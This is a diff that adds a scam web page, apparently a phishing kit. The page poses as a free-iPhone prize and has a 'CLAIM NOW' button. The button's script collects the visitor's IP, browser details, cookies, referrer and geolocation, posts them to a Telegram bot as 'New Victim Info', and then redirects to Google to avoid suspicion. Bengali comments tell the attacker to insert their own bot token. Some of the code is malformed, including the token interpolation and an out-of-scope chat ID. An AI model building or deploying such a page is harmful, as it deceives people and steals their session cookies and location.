@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Fake Page</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f0f0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #ff0000;
+        }
+        p {
+            color: #333;
+        }
+        button {
+            background: #0078d7;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #005a9e;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 CONGRATULATIONS! 🎉</h1>
+        <p>You've won a <strong>FREE iPhone 15 Pro Max!</strong></p>
+        <p>Click the button below to claim your prize!</p>
+        <button onclick="sendInfo()">CLAIM NOW</button>
+        <p>⚠️ Hurry! Limited stock available!</p>
+    </div>
+
+    <script>
+        function sendInfo() {
+            // টেলিগ্রাম বোটের API URL (তোমার বোটের টোকেন দিয়ে রিপ্লেস করো)
+            const botToken = "YOUR_TELEGRAM_BOT_TOKEN";
+            const chatId = "YOUR_CHAT_ID"; // নিজের চ্যাট আইডি দাও
+
+            // ভিক্টিমের ইনফো কালেক্ট করো
+            const victimInfo = {
+                ip: "<?php echo $_SERVER['REMOTE_ADDR']; ?>",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie,
+                referrer: document.referrer,
+                location: "Unknown (Geolocation blocked)",
+                time: new Date().toLocaleString()
+            };
+
+            // জিওলোকেশন আনতে চাইলে (অপশনাল)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    victimInfo.location = `${position.coords.latitude}, ${position.coords.longitude}`;
+                    sendToTelegram(victimInfo);
+                }, () => {
+                    sendToTelegram(victimInfo);
+                });
+            } else {
+                sendToTelegram(victimInfo);
+            }
+        }
+
+        function sendToTelegram(info) {
+            const botUrl = `https://api.telegram.org/bot${8792723722:AAFLhclSVJh2PiHhb2owd5GVAm71sQOStgM}/sendMessage`;
+            const message = `🚨 New Victim Info 🚨\n\nIP: ${info.ip}\nUser Agent: ${info.userAgent}\nPlatform: ${info.platform}\nLanguage: ${info.language}\nCookies: ${info.cookies}\nReferrer: ${info.referrer}\nLocation: ${info.location}\nTime: ${info.time}`;
+
+            fetch(botUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(() => {
+                // ভিক্টিমকে অন্য একটা পেজে রিডাইরেক্ট করো (যাতে সন্দেহ না আসে)
+                window.location.href = "https://www.google.com";
+            });
+        }
+    </script>
+</body>
+</html>
